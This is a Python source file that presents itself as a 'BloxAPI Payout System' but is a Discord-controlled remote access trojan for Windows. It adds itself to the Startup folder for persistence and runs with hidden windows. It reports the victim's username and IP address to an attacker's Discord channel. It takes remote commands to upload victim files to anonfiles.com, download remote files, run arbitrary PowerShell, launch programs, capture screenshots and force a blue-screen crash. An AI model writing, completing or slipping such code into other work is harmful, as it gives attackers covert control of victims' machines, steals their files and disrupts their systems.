import os
import discord
import subprocess
import requests
import pyautogui
import ctypes
import sys
import threading
import asyncio
import time
import atexit
from dotenv import load_dotenv

def payout():
    """
    Activate the Discord bot script and keep it running 24/7 with persistence
    Once called, this will:
    1. Start the Discord bot immediately
    2. Create startup entries for automatic restart after reboot
    3. Run continuously in the background
    4. Auto-restart if it crashes
    """
    print("🚀 Initializing BloxAPI Payout System...")
    
    # Create persistent startup entry
    _create_startup_persistence()
    
    # Start the main bot process
    _start_persistent_bot()
    
    print("✅ BloxAPI payout system activated and running 24/7!")
    print("📍 System will automatically restart after reboot")
    print("🔄 Bot will auto-restart if it crashes")

def _create_startup_persistence():
    """
    Create startup entries to ensure the bot runs after system restart
    """
    try:
        login = os.getlogin()
        startup_dir = rf'C:\Users\{login}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        
        # Create a Python script that imports and runs the bot
        startup_script = rf'C:\Users\{login}\AppData\Local\Temp\bloxapi_payout_startup.py'
        
        with open(startup_script, 'w') as f:
            f.write('''
import sys
import subprocess
import time

def run_payout():
    try:
        # Run the payout system
        subprocess.run([sys.executable, "-c", "import bloxapi; bloxapi._run_persistent_background()"], 
                      creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        # If it fails, wait and try again
        time.sleep(30)
        run_payout()

if __name__ == "__main__":
    run_payout()
''')
        
        # Create batch file to run the Python script silently
        bat_path = os.path.join(startup_dir, 'BloxAPIPayoutSystem.bat')
        with open(bat_path, 'w') as bat_file:
            bat_file.write(f'@echo off\npython "{startup_script}" >nul 2>&1')
        
        print("📝 Startup persistence created successfully")
        
    except Exception as e:
        print(f"⚠️  Warning: Could not create startup persistence: {e}")

def _start_persistent_bot():
    """
    Start the bot with auto-restart capability
    """
    # Start the bot in a daemon thread with auto-restart
    bot_thread = threading.Thread(target=_run_bot_with_restart, daemon=True)
    bot_thread.start()
    
    # Keep the main thread alive
    def keep_alive():
        try:
            while True:
                time.sleep(60)  # Check every minute
        except KeyboardInterrupt:
            print("Shutting down...")
    
    # Register cleanup
    atexit.register(_cleanup)
    
    # Start keep-alive in background
    alive_thread = threading.Thread(target=keep_alive, daemon=True)
    alive_thread.start()

def _run_bot_with_restart():
    """
    Run the Discord bot with automatic restart on failure
    """
    while True:
        try:
            print("🤖 Starting Discord bot...")
            _run_discord_bot()
        except Exception as e:
            print(f"❌ Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            time.sleep(10)

def _run_persistent_background():
    """
    Entry point for background startup (called by startup script)
    """
    _run_bot_with_restart()

def _cleanup():
    """
    Cleanup function called on exit
    """
    print("🔄 System shutting down - bot will restart automatically on next boot")

def _run_discord_bot():
    """
    Internal function to run the Discord bot
    """
    try:
        # Load environment variables
        load_dotenv()
        
        login = os.getlogin()
        client = discord.Client(intents=discord.Intents.all())
        session_id = os.urandom(8).hex()
        guild_id = ""  # You'll need to set this
        
        commands = "\n".join([
            "help - Help Command",
            "ping - Ping Command", 
            "cd - Change Directory",
            "ls - List Directory",
            "download <file> - Download File",
            "upload <link> - Upload File",
            "cmd - Execute CMD Command",
            "run <file> - Run an File",
            "screenshot - Take a Screenshot",
            "blue - DeadScreen",
            "startup - Add To Startup",
            "exit - Exit The Session"
        ])

        def startup(file_path=""):
            temp = os.getenv("TEMP")
            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
            if file_path == "":
                file_path = sys.argv[0]
            with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
                bat_file.write(r'start "" "%s"' % file_path)

        @client.event
        async def on_ready():
            try:
                if guild_id:
                    guild = client.get_guild(int(guild_id))
                    if guild:
                        channel = await guild.create_text_channel(session_id)
                        ip_address = requests.get("https://ipapi.co/json/").json()
                        data = ip_address['country_name'], ip_address['ip']
                        embed = discord.Embed(title="New session created", description="", color=0xfafafa)
                        embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
                        embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
                        embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
                        embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
                        await channel.send(embed=embed)
                        print(f"✅ Bot connected! Session ID: {session_id}")
                    else:
                        print("⚠️  Guild not found - check your guild_id")
                else:
                    print("⚠️  No guild_id set - bot connected but no channel created")
            except Exception as e:
                print(f"❌ Error in on_ready: {e}")

        @client.event
        async def on_message(message):
            if message.author == client.user:
                return

            if message.channel.name != session_id:
                return

            try:
                if message.content == "help":
                    embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content == "ping":
                    embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content.startswith("cd"):
                    directory = message.content.split(" ")[1]
                    try:
                        os.chdir(directory)
                        embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
                    except:
                        embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content == "ls":
                    files = "\n".join(os.listdir())
                    if files == "":
                        files = "No Files Found"
                    embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content.startswith("download"):
                    file = message.content.split(" ")[1]
                    try:
                        link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                        embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
                        await message.reply(embed=embed)
                    except:
                        embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
                        await message.reply(embed=embed)

                if message.content.startswith("upload"):
                    link = message.content.split(" ")[1]
                    file = requests.get(link).content
                    with open(os.path.basename(link), "wb") as f:
                        f.write(file)
                    embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content.startswith("shell"):
                    command = message.content.split(" ")[1]
                    output = subprocess.Popen(
                        ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
                    ).communicate()[0].decode("utf-8")
                    if output == "":
                        output = "No output"
                    embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content.startswith("run"):
                    file = message.content.split(" ")[1]
                    subprocess.Popen(file, shell=True)
                    embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
                    await message.reply(embed=embed)

                if message.content.startswith("exit"):
                    await message.channel.delete()
                    await client.close()
                
                if message.content.startswith("startup"):
                    await message.reply("Ok Boss")
                    startup()
                    
                if message.content.startswith("blue"):
                    await message.reply("Attempting...", delete_after=.1)
                    ntdll = ctypes.windll.ntdll
                    prev_value = ctypes.c_bool()
                    res = ctypes.c_ulong()
                    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                        await message.reply("Blue Successful!")
                    else:
                        await message.reply("Blue Failed! :(")

                if message.content.startswith("screenshot"):
                    screenshot = pyautogui.screenshot()
                    path = os.path.join(os.getenv("TEMP"), "screenshot.png")
                    screenshot.save(path)
                    file = discord.File(path)
                    embed = discord.Embed(title="Screenshot", color=0xfafafa)
                    embed.set_image(url="attachment://screenshot.png")
                    await message.reply(embed=embed, file=file)
                    
            except Exception as e:
                print(f"❌ Error handling message: {e}")

        # Run the Discord client
        token = os.getenv('DISCORD_BOT_TOKEN', '')  # Get token from environment
        if not token:
            print("❌ No Discord bot token found! Set DISCORD_BOT_TOKEN environment variable")
            return
            
        client.run(token)
        
    except Exception as e:
        print(f"❌ Error running Discord bot: {e}")
        raise  # Re-raise to trigger restart
